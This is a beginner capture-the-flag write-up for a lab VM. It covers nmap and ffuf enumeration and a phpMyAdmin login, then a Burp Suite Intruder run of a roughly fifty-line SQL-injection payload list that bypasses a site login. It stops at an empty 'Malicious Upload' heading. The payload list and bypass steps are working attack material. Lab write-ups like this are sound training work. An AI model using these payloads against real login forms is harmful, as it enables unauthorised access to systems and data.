Documentation for the fourth box of the POC serie, a beginer box used to familarize with pentest tools and procedures.


# BOX POC 4

For this box, only an OVA for a virtual machine is provided, where I can see IP for beginning my pentest : 192.168.56.158, I put this in an $ip var.

---

## Summary

1. [Scan](#scan)
2. [Web Enumeration](#Web-Enumeration)
3. [Burp Suite](#Burp-Suite)
4. [Malicious Upload](#Malicious-Upload)


---

## Scan

We begin with a classic discovery of the network with this nmap command : ```nmap -sS -sV -sC -T4 $ip```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-22 14:11 CEST
Nmap scan report for 192.168.56.158
Host is up (0.00038s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 0e3ff44153b6271ab0a5c065b09d0b53 (RSA)
|   256 3891c5b542d638dc7245a7685e768099 (ECDSA)
|_  256 d7dc16365b235097ccfe2169b72a00d3 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: BACKUP YOUR DATA
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
MAC Address: 08:00:27:61:FB:5E (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.77 seconds
```

### Nmap scan summary

#### Port 22

Port 22 (SSH) is open and running OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
Possible bruteforce / weak user access. Version might be vulnerable.

#### Port 80

Port 80 (HTTP) is open and running Apache httpd 2.4.38 ((Debian))
Web service. We can start by exploring it manually and then fuzzing/enumeration.
The title of the webpage is: "BACKUP YOUR DATA" → suspicious or hinting at downloadable files (maybe .zip, .bak, etc.)
No httponly flag on PHPSESSID → might indicate a PHP app.

## Web enumeration

Firstly we check the website at ```http://192.168.56.158```. We land on a welcome page for a data server, inviting us to log in to access the data.

After a web enumeration ```ffuf -c -w '/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt' -u "http://$ip/FUZZ"```, this reveals two interesting directories: :

```
data                    [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 0ms]
phpmyadmin              [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 0ms]
```

We visit /phpmyadmin, which presents a login page. We attempt basic credentials such as:
```admin``` / (empty password)
```admin``` / ```admin```
These do not work.
Next, we visit ```/data``` and discover a file named ```/data/injection-sql.txt```. Its contents suggest common SQL injection payloads:

```
Je me demande bien a quoi peut servir ce fichier ??

or 1=1
or 1=1--
or 1=1#
or 1=1/*
or 1=1 -- -
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

These payloads indicate the presence of an SQL injection vulnerability elsewhere in the application, likely intended to be used for authentication bypass or database extraction. Let's explore Burp Suite !

<details>

<summary>SQL Injection Explanation</summary>

SQL Injection is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. 
By injecting malicious SQL code into user inputs, an attacker can bypass authentication, extract data, or even modify the database.

</details>


## Burp Suite

<details>

<summary>What is Burp Suite ?</summary>

Here is an introduction from my AI assistant :

Burp Suite is a powerful web security testing tool used by pentesters and bug bounty hunters. 
It acts as an intercepting proxy, allowing you to capture, inspect, and modify HTTP requests and responses between your browser and a web application. 
It also includes tools like Intruder (for automation) and Repeater (for manual testing).

</details>

Let's try Burpt Suite, first we need to configure it and test it.

<details>

<summary>Burp Suite configutation</summary>

- Launch Burp Suite (Community Edition is fine)
- Configure your browser to use Burp as a proxy
    Open Burp → Go to Proxy > Intercept

    Set browser proxy to:

    127.0.0.1:8080 (Firefox is easiest for this; or use Burp’s browser)

- Visit the login form in your browser
    Fill in the form with dummy data (e.g., test:test)
    Click "Login"

And here Burp Suite should send a new entry in the proxy tab, showing results of the request like this :

---

</details>

<img width="3356" height="1832" alt="POC4BurpSuite" src="https://github.com/user-attachments/assets/befe04e8-846e-40e6-9daa-ca3f4429fd43" />

Now that it work, we need to right click on the request and ```Send to repeater```, go to the repeater tab and change the vars in the ```Request body parameters``` which is in the ```Inspector``` right tab, here are the two parameters we should change :
(don't forget to press enter in order to confirm the change)

```
pma_username : test
pma_password : test
```

Let's try this first combination.

```
pma_username : admin'--
pma_password : anything
```

And here is the result, we can find it in the far bottom of the ```Response``` left tab.

```
<div class="alert alert-danger" role="alert">
  <img src="themes/dot.gif" title="" alt="" class="icon ic_s_error">
  mysqli::real_connect(): (HY000/1045): Access denied for user 'admin'--'@'localhost' (using password: YES)
</div>
```

But the problem is that if we try a second time, this error message will appear for every new try :

```
Failed to set session cookie. Maybe you are using HTTP instead of HTTPS to access phpMyAdmin.
```

And this is because phpMyAdmin checks the session cookie and may refuse to set it if certain headers are missing, malformed, or if a previously bad session ID is reused.
Burp Intruder does not handle cookies dynamically. It reuses the exact cookie from the original request, even if it's invalid or expired. Firefox, on the other hand, handles cookies normally with a fresh session.
So to bypass this protection we could change our tools to find one that can generate a new session each time, but for this box I'll just go ahead and test our second login interface, the home webpage for data storage purposes.

However, we have many combinations to try, so let's use the ```Intruder``` tab of Burp Suite instead of the repeater to save some time.
Like for the repeater, we send a concludent request ```to Intruder```, choose the ```sniper attack``` type, and in the ```Positions``` tab, click ```Clear``` to remove default marks if there is already.
Then, highlight just the value you want to inject into (like the username or password) and click "Add §".
And now we just need to put our payloads list (the one on ```/data/injection-sql.txt```) on the payload tab, inside the payload configuration, and click on ```Start attack```.
A new window open, use filter by length to have the results with a shorter character number in result, and here you can see results that didn't return any error, so maybe they work ?

<img width="2997" height="1661" alt="POC4BurpSuiteIntruderAttack" src="https://github.com/user-attachments/assets/9d53e100-f6db-403b-976e-6d70870a19ba" />

After testing ```admin' or '1'='1``` as password it work, now I'm logged in the website and can import a file here.

<details>

<summary>Payload Breakdown</summary>

```
admin' or '1'='1
```

This payload exploits a login form by injecting SQL logic.

admin' closes the original string input.

or '1'='1 always evaluates to true.

The final SQL query becomes something like:
```
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '';
```
Since '1'='1' is always true, the authentication is bypassed, and access is granted.

</details>

I can see in this webpage the second flag too : ```FLAG2{L-ARCHIVAGE-DE-DONNEES-SANS-VERIFICATION-EST-TRES-DANGEREUX}``` which could be in english ```FLAG2{STORING-DATA-WITHOUT-VERIFICATION-IS-VERY-DANGEROUS}```.

## Malicious Upload



